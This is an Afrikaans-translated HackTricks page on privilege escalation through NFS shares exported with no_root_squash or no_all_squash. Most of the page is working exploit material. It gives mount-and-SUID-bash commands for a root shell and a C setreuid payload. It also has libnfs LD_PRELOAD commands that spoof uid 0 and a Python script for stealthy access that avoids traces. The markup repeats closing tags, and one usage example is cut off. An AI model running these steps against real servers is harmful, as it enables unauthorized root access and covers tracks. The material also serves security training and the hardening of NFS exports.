{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


Lees die _ **/etc/exports** _ lêer, as jy 'n gids vind wat geconfigureer is as **no\_root\_squash**, dan kan jy dit **toegang** vanaf **as 'n kliënt** en **binne** daardie gids **skryf** **asof** jy die plaaslike **root** van die masjien was.

**no\_root\_squash**: Hierdie opsie gee basies gesag aan die root-gebruiker op die kliënt om lêers op die NFS-bediener as root te benader. En dit kan lei tot ernstige sekuriteitsimplikasies.

**no\_all\_squash:** Dit is soortgelyk aan die **no\_root\_squash** opsie, maar dit geld vir **nie-root gebruikers**. Stel jou voor, jy het 'n shell as nobody gebruiker; het die /etc/exports lêer nagegaan; no\_all\_squash opsie is teenwoordig; kyk na die /etc/passwd lêer; emuleer 'n nie-root gebruiker; skep 'n suid lêer as daardie gebruiker (deur te monteer met nfs). Voer die suid uit as nobody gebruiker en word 'n ander gebruiker.

# Privilege Escalation

## Remote Exploit

As jy hierdie kwesbaarheid gevind het, kan jy dit benut:

* **Monteer daardie gids** in 'n kliëntmasjien, en **as root kopieer** binne die gemonteerde gids die **/bin/bash** binêre en gee dit **SUID** regte, en **voerde** van die slagoffer masjien daardie bash binêre uit.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Monteer daardie gids** op 'n kliëntmasjien, en **as root kopieer** binne die gemonteerde vouer ons saamgecompileerde payload wat die SUID-toestemming sal misbruik, gee vir dit **SUID** regte, en **voer vanaf die slagoffer** masjien daardie binêre uit (jy kan hier 'n paar [C SUID payloads](payloads-to-execute.md#c) vind).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Plaaslike Exploit

{% hint style="info" %}
Let daarop dat as jy 'n **tunnel van jou masjien na die slagoffer masjien kan skep, jy steeds die Remote weergawe kan gebruik om hierdie privaatheidsverhoging te exploiteer deur die vereiste poorte te tunnelle**.\
Die volgende truuk is in die geval waar die lêer `/etc/exports` **'n IP aandui**. In hierdie geval **sal jy in elk geval nie die **remote exploit** kan gebruik nie en jy sal hierdie truuk moet **misbruik**.\
Nog 'n vereiste vir die exploit om te werk is dat **die eksport binne `/etc/export`** **die `insecure` vlag moet gebruik**.\
\--_Ek is nie seker of hierdie truuk sal werk as `/etc/export` 'n IP adres aandui nie_--
{% endhint %}

## Basiese Inligting

Die scenario behels die eksploitering van 'n gemonteerde NFS deel op 'n plaaslike masjien, wat 'n fout in die NFSv3 spesifikasie benut wat die kliënt toelaat om sy uid/gid te spesifiseer, wat moontlik ongeoorloofde toegang moontlik maak. Die eksploitering behels die gebruik van [libnfs](https://github.com/sahlberg/libnfs), 'n biblioteek wat die vervalsing van NFS RPC oproepe toelaat.

### Samevoeging van die Biblioteek

Die biblioteek samevoegingsstappe mag aanpassings vereis gebaseer op die kern weergawe. In hierdie spesifieke geval was die fallocate syscalls uitgekommenteer. Die samevoegingsproses behels die volgende opdragte:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Voer die Exploit uit

Die exploit behels die skep van 'n eenvoudige C-programma (`pwn.c`) wat voorregte na root verhoog en dan 'n shell uitvoer. Die program word gecompileer, en die resulterende binêre (`a.out`) word op die deel geplaas met suid root, met behulp van `ld_nfs.so` om die uid in die RPC-oproepe te vervals:

1. **Compileer die exploit kode:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Plaas die exploit op die deel en verander sy toestemmings deur die uid te vervals:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Voer die exploit uit om root voorregte te verkry:**
```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell vir Stealthy Lêertoegang
Sodra root-toegang verkry is, om met die NFS-deel te kommunikeer sonder om eienaarskap te verander (om spore te vermy), word 'n Python-skrip (nfsh.py) gebruik. Hierdie skrip pas die uid aan om ooreen te stem met dié van die lêer wat toeganklik is, wat interaksie met lêers op die deel moontlik maak sonder toestemmingprobleme:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Hardloop soos:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
